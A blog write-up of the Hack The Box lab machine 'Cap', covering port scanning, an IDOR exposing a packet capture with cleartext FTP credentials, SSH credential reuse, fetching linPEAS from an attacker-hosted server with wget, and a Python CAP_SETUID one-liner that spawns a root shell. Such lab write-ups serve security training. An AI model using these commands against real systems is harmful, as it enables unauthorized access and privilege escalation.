---
title: "HTB - Cap"
date: 2026-02-28
draft: false
tags: ["HTB", "Linux", "Write-Up"]
---

#### Box Details 

|   |   |
|---|---|
| Difficulty | Easy |
| Type | Linux |

#### Port Scan
```
└─$ nmap -sV 10.129.7.242 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-01 17:11 +0100
Nmap scan report for 10.129.7.242
Host is up (0.037s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.23 seconds
```

## User Flag

On port 80 there is a web application in which we are logged in by default as the user **Nathan**. In the application we can check out different network stuff. When we click the burger menu and select **Security Snapshot** we can download a _.pcap_ file. Seems like every time we visit this page, a new file gets created. There is an **IDOR** vulnerability through which we can visit the page `http://10.10.10.245/data/0` which was already there.

![](/images/writeup_screens/htb_cap/htb_cap_4.png)

If we download it and look through it with e.g. _WireShark_, we can find captured packets from a _FTP_ login process. We can see credentials in clear-text: 

![](/images/writeup_screens/htb_cap/htb_cap_1.png)

```
user: nathan
pass: Buck3tH4TF0RM3!
```

With these credentials we can access the _FTP_ server running on the standard port 21 at the target: 

![](/images/writeup_screens/htb_cap/htb_cap_2.png)

We can `ls` the files and find a `user.txt`. Download the file with `get user.txt` and obtain the user flag. 

---

## Root Flag

As always we should consider credential-reuse. I tried to use the previously obtained _FTP_ credentials to connect to the target via _SSH_ which was successful. We are now connected to the target as the user **Nathan**. 

What we could do now is to start automatic enumeration with [_LinPeas.sh_](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS). To do so we can download the script to our kali machine and host a simple python web server in the download directory with `$ python3 -m http.server 80`. On the target machine we use `$ wget KALI_IP/linpeas.sh` to download the file into the users home directory followed by `$ chmod +x ./linpeas.sh` to make it executable. We can now start the automatic Linux enumartion tool with `$ ./linpeas.sh`. 

If we scroll down in the output we can see that the script found that _/usr/bin/python3.8_ has special capabilities set: 

![](/images/writeup_screens/htb_cap/htb_cap_3.png)

We could have found this by manual enumeration as well:

```
$ /usr/sbin/getcap -r / 2>/dev/null
```

![](/images/writeup_screens/htb_cap/htb_cap_5.png)

With this information we can go to [GTFOBins](https://gtfobins.org/) and search for _Python_. We look under **Shell** &rarr; **Capabilities** and can see that when the _CAP_SETUID_ capabilitiy is set (which is the case as we learned above) we may try the following command to escalate our privileges: 

```
python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

The privilege escalation worked and we successfully spawned a root shell:

![](/images/writeup_screens/htb_cap/htb_cap_6.png)

